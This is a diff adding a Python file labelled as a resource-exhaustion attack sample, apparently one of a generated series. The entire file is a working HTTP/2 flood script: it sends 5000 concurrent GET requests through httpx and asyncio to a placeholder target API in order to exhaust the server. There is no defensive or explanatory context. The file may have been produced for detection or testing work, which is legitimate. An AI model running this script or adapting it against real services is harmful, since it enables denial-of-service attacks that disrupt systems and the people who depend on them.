@@ -1,0 +1,16 @@
+# Resource Exhaustion - Concurrent Attack Sample 10
+# Created: 2026-03-30T22:24:11.730580
+# Type: Connection Flood / Thread Exhaustion / WebSocket Flood
+
+# HTTP/2 Stream Multiplexing Abuse - Sample 4
+import httpx
+import asyncio
+
+async def http2_abuse():
+    async with httpx.AsyncClient(http2=True) as client:
+        url = "https://target.com/api"
+        tasks = [client.get(url) for _ in range(5000)]
+        responses = await asyncio.gather(*tasks)
+        print(f"Completed: {len(responses)} requests")
+
+asyncio.run(http2_abuse())
